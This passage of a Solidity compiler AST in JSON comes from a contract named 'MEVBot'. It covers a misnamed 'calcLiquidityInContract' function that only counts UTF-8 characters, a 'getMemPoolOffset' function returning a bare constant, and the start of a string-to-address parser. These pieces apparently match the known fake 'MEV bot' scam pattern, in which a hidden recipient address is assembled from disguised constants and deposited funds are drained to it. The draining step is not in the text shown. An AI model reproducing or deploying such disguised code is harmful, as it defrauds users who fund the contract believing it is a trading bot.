																			"nodeType": "Literal",
																			"src": "7782:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_240_by_1",
																				"typeString": "int_const 240"
																			},
																			"value": "0xF0"
																		},
																		"src": "7778:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": {
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 695,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 693,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 666,
																				"src": "7838:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30784638",
																				"id": 694,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7842:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_248_by_1",
																					"typeString": "int_const 248"
																				},
																				"value": "0xF8"
																			},
																			"src": "7838:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": {
																			"condition": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 703,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 701,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 666,
																					"src": "7898:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30784643",
																					"id": 702,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7902:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_252_by_1",
																						"typeString": "int_const 252"
																					},
																					"value": "0xFC"
																				},
																				"src": "7898:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			},
																			"falseBody": {
																				"id": 713,
																				"nodeType": "Block",
																				"src": "7955:41:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 711,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 709,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 642,
																								"src": "7973:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "36",
																								"id": 710,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "7980:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_6_by_1",
																									"typeString": "int_const 6"
																								},
																								"value": "6"
																							},
																							"src": "7973:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 712,
																						"nodeType": "ExpressionStatement",
																						"src": "7973:8:0"
																					}
																				]
																			},
																			"id": 714,
																			"nodeType": "IfStatement",
																			"src": "7895:101:0",
																			"trueBody": {
																				"id": 708,
																				"nodeType": "Block",
																				"src": "7908:41:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 706,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 704,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 642,
																								"src": "7926:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "35",
																								"id": 705,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "7933:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_5_by_1",
																									"typeString": "int_const 5"
																								},
																								"value": "5"
																							},
																							"src": "7926:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 707,
																						"nodeType": "ExpressionStatement",
																						"src": "7926:8:0"
																					}
																				]
																			}
																		},
																		"id": 715,
																		"nodeType": "IfStatement",
																		"src": "7835:161:0",
																		"trueBody": {
																			"id": 700,
																			"nodeType": "Block",
																			"src": "7848:41:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 698,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 696,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 642,
																							"src": "7866:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "34",
																							"id": 697,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "7873:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_4_by_1",
																								"typeString": "int_const 4"
																							},
																							"value": "4"
																						},
																						"src": "7866:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 699,
																					"nodeType": "ExpressionStatement",
																					"src": "7866:8:0"
																				}
																			]
																		}
																	},
																	"id": 716,
																	"nodeType": "IfStatement",
																	"src": "7775:221:0",
																	"trueBody": {
																		"id": 692,
																		"nodeType": "Block",
																		"src": "7788:41:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 690,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 688,
																						"name": "ptr",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 642,
																						"src": "7806:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "+=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "33",
																						"id": 689,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "7813:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_3_by_1",
																							"typeString": "int_const 3"
																						},
																						"value": "3"
																					},
																					"src": "7806:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 691,
																				"nodeType": "ExpressionStatement",
																				"src": "7806:8:0"
																			}
																		]
																	}
																},
																"id": 717,
																"nodeType": "IfStatement",
																"src": "7715:281:0",
																"trueBody": {
																	"id": 684,
																	"nodeType": "Block",
																	"src": "7728:41:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 682,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 680,
																					"name": "ptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 642,
																					"src": "7746:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "+=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 681,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7753:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "7746:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 683,
																			"nodeType": "ExpressionStatement",
																			"src": "7746:8:0"
																		}
																	]
																}
															},
															"id": 718,
															"nodeType": "IfStatement",
															"src": "7654:342:0",
															"trueBody": {
																"id": 676,
																"nodeType": "Block",
																"src": "7668:41:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 674,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 672,
																				"name": "ptr",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 642,
																				"src": "7686:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "+=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 673,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7693:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "7686:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 675,
																		"nodeType": "ExpressionStatement",
																		"src": "7686:8:0"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 661,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 659,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 642,
														"src": "7551:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 660,
														"name": "end",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 649,
														"src": "7557:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7551:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 720,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 657,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 655,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 639,
															"src": "7544:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 656,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7548:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "7544:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 658,
													"nodeType": "ExpressionStatement",
													"src": "7544:5:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 663,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7562:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 662,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 639,
															"src": "7562:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 664,
													"nodeType": "ExpressionStatement",
													"src": "7562:3:0"
												},
												"nodeType": "ForStatement",
												"src": "7539:467:0"
											}
										]
									},
									"documentation": null,
									"id": 722,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "calcLiquidityInContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 637,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 636,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 722,
												"src": "7408:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 635,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "7408:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7407:19:0"
									},
									"returnParameters": {
										"id": 640,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 639,
												"mutability": "mutable",
												"name": "l",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 722,
												"src": "7450:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 638,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7450:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7449:8:0"
									},
									"scope": 1583,
									"src": "7375:637:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 729,
										"nodeType": "Block",
										"src": "8075:33:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "323033303936343835",
													"id": 727,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8092:9:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_203096485_by_1",
														"typeString": "int_const 203096485"
													},
													"value": "203096485"
												},
												"functionReturnParameters": 726,
												"id": 728,
												"nodeType": "Return",
												"src": "8085:16:0"
											}
										]
									},
									"documentation": null,
									"id": 730,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 723,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8043:2:0"
									},
									"returnParameters": {
										"id": 726,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 725,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 730,
												"src": "8069:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 724,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8069:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8068:6:0"
									},
									"scope": 1583,
									"src": "8018:90:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 905,
										"nodeType": "Block",
										"src": "8356:832:0",
										"statements": [
											{
												"assignments": [
													738
												],
												"declarations": [
													{
														"constant": false,
														"id": 738,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 905,
														"src": "8366:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 737,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8366:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 743,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 741,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 732,
															"src": "8391:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 740,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "8385:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 739,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8385:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 742,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8385:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8366:28:0"
											},
											{
												"assignments": [
													745
												],
												"declarations": [
													{
														"constant": false,
														"id": 745,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 905,
														"src": "8404:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 744,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8404:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 747,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 746,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8420:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8404:17:0"
											},
											{
												"assignments": [
													749
												],
												"declarations": [
													{
														"constant": false,
														"id": 749,
														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 905,
														"src": "8431:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 748,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8431:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 750,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8431:10:0"
											},
											{
												"assignments": [
													752
												],
												"declarations": [
													{
														"constant": false,
														"id": 752,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 905,
														"src": "8451:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 751,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8451:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 753,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8451:10:0"
											},
											{
												"body": {
													"id": 898,
													"nodeType": "Block",
													"src": "8513:638:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 771,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 769,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 745,
																	"src": "8527:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 770,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8536:3:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "8527:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 772,
															"nodeType": "ExpressionStatement",
															"src": "8527:12:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 783,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 773,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 749,
																	"src": "8553:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 778,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 738,
																						"src": "8572:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 780,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 779,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 755,
																						"src": "8576:1:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8572:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 777,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8566:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 776,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8566:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 781,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8566:13:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 775,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8558:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 774,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8558:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 782,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8558:22:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8553:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 784,
															"nodeType": "ExpressionStatement",
															"src": "8553:27:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 797,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 785,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 752,
																	"src": "8594:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 790,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 738,
																						"src": "8613:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 794,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 793,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 791,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 755,
																							"src": "8617:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 792,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8621:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "8617:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8613:10:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 789,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8607:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 788,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
